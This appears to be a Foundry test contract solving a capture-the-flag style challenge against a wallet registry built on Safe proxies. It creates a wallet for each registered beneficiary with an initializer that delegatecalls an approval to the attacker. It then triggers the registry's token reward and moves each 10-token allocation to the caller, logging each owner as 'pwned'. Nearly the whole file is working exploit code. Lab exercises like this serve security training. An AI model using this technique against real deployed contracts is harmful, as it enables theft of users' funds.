// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "safe-contracts/contracts/Safe.sol";
import "safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import { SafeProxyFactory } from "safe-contracts/contracts/proxies/SafeProxyFactory.sol";

contract RegistryAttack is Test {

    address public immutable masterCopy;
    address public immutable walletFactory;
    IERC20 public immutable token;
    address public immutable registry;
    uint public constant amount = 10e18;

    constructor(address masterCopyAddress, address walletFactoryAddress, address tokenAddress, address _registry) {
        masterCopy = masterCopyAddress;
        walletFactory = walletFactoryAddress;
        token = IERC20(tokenAddress);
        registry = _registry;
    }

    // approves spender for 10 DVT tokens
    function delegateApprove(address _spender, address _token) external {
        IERC20(_token).approve(_spender, amount);
    }

    function attack (address[] memory beneficiaries) external {

        for(uint i = 0; i < beneficiaries.length; i++) {

            address[] memory owner = new address[](1);
            owner[0] = beneficiaries[i];
            bytes memory _initializer = abi.encodeWithSelector(
                Safe.setup.selector, // reference to `Safe` contract `setup` function selector
                owner, // address[] _owners
                1, // uint256 _threshold
                address(this), // address `to`
                abi.encodeWithSelector(RegistryAttack.delegateApprove.selector, address(this), address(token)),
                address(0), // address fallback handler
                address(0), // address paymentToken
                0, // uint256 payment
                address(0) // address paymentReceiver
            );
            // params: {address _singleton, bytes memeory initializer, saltNonce, callback}
            (SafeProxy _proxy) = SafeProxyFactory(walletFactory).createProxyWithCallback(
                masterCopy, 
                _initializer, 
                i, 
                IProxyCreationCallback(registry)
            );

            token.transferFrom(address(_proxy), msg.sender, amount);
            console.log("Owner", i, "pwned. We get their DVT allocation:", amount / 1e18);
        }
    }
}